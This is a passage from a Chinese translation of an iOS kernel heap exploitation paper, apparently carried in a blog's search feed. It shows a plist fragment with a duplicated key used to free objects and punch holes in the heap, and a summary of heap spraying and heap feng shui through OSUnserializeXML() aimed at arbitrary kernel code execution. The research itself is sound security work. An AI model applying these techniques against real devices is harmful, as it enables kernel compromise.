&lt;data&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/data&gt; &lt;key&gt;CCCC&lt;/key&gt; &lt;true /&gt; &lt;/dict&gt; &lt;/plist&gt; 在这个例子中，可以看到键值 CCCC 被设定了两次。第一次是插入到字典中，第二次更新键值的数值，且前一个值已被破坏。这个数据对象的破坏将会释放该数值对象本身，以及释放由 base64 编码重复的 Z 字符所组成的数值。我们也因此在内存中有效地戳了一个洞。拼图的最后一块是你构建的用于控制堆的 XML.plist 文件是没有问题的。 总结本文中我们首先重演了 iOS 内核堆空间分配，以及不同作者在之前所提到的它的利用。接着，我们介绍了其他的内核堆分配器以及它们所带来的额外的堆元数据。我们讨论了如何重写这些可以被利用的数据，以及提到了这些分配器目前的变化。接下来我们离内核堆元数据结构的利用只有一步之遥，我们讨论了 iOS C++ 内核对象，以及他们在内存结构的布局和在内存中重写他们可以得到什么。最后，我们介绍一种通用的技术，利用 OSUnserializeXML() 可以实现堆喷射和堆风水。这种新技术不仅可以使用任意数据喷射堆来完全控制它的布局，也可以使用有意思的内核应用数据来填充内核堆，该应用数据采用内核级别的 C++ 对象形式，一旦重写，将会允许任意代码执行。 References[1] E. PERLA, M. OLDANI, ”A GUIDE TO KERNEL EXPLOITATION - ATTACKING THE CORE”, 2010, HTTP://WWW.ATTACKINGTHECORE.COM/[2] S. ESSER, ”IOS KERNEL EXPLOITATION, BLACKHAT USA”, 2011 HTTPS://MEDIA.BLACKHAT.COM/BH-US- 11/ESSER/BH_US_11_ESSER_EXPLOITING_THE_IOS_KERNEL_WP.PDF[3] C. MILLER, D. BLAZAKIS, D. DAIZOVI, S. ESSER, V. IOZZO, R.-P. WEINMANN, ”IOS HACKER’S HANDBOOK”, 2012, HTTP://EU.WILEY.COM/WILEYCDA/WILEYTITLE/PRODUCTCD-1118204123,DESCCD- DESCRIPTION.HTML[4] A. SOTIROV, ”HEAP FENG SHUI IN JAVASCRIPT, BLACKHAT EUROPE”, 2007 HTTPS://WWW.BLACKHAT.COM/PRESENTATIONS/BH-USA-07/SOTIROV/WHITEPAPER/BH- USA-07-SOTIROV-WP.PDF 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
  
  
</search>
